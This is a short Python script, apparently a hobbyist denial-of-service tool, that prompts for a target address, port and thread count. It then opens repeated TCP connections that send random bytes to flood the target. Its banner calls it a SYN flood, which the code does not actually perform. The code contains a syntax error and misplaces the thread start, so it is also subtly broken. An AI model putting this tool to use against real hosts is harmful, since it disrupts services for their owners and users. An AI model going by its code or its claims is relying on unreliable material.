#!/usr/bin/python3
#Code by Leeon123

import threading
import socket
import random
import time

print ('''
 _____ ____ ____    ____                      
|_   _/ ___|  _ \  |  _ \  ___  ___  ___ _ __ 
  | || |   | |_) | | | | |/ _ \/ __|/ _ \ '__|
  | || |___|  __/  | |_| | (_) \__ \  __/ |   
  |_| \____|_|     |____/ \___/|___/\___|_|  
               #-- SYN Flood --#
[!]Python3 version               Code By Leeon123 
=================================================''')
time.sleep(0.5)
ip = str(input("Url/ip:"))
port = int(input("Port:"))
thread_num = int(input("Threads:"))
times = int(input("Sockets of a thrrad:"))
print ("[!]Start a syn flood\r\n[!]Thread:",thread_num)
time.sleep(1)

def run():
	bytes = random._urandom(4092)
	while True:
		try:
			print("[!]Try to build a new thread")
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port))
			for y in range(times):
				  s.send(bytes)
			print ("[*]Request sent!")
		except:
			s.close()
			print ("[!]Error, socket close")
			
for i in range(thread_num):
    th = threading.Thread(target = run)
th.start()
